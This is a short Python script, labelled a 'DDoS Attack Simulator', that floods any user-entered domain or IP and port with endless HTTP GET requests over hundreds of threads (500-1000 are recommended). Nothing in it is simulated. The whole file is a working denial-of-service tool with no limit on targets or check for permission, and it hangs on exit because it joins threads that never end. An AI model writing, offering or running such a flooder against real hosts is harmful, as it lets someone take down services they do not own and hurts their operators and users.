import threading
import socket
import time

print("DDoS Attack Simulator")

target_domain = input("Enter target domain/IP: ")
target_port = int(input("Enter target port: "))

attack_threads = int(input("Enter number of attack threads (500-1000 recommended): "))

print(f"Attacking {target_domain}:{target_port} with {attack_threads} threads...")

def attack():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_domain, target_port))
            request = (
                b"GET / HTTP/1.1\r\n"
                b"Host: " + bytes(target_domain, 'utf-8') + b"\r\n"
                b"Connection: close\r\n"
                b"\r\n"
            )
            s.send(request)
            s.close()
        except socket.error as e:
            print(f"Socket error: {e}")

start_time = time.time()

threads = []
for i in range(attack_threads):
    thread = threading.Thread(target=attack)
    threads.append(thread)
    thread.start()

try:
    while True:
        elapsed_time = time.time() - start_time
        print(f"\rAttack elapsed time: {elapsed_time:.2f} seconds", end="")
        time.sleep(1)
except KeyboardInterrupt:
    print("\nAttack stopped by user.")
    for thread in threads:
        thread.join()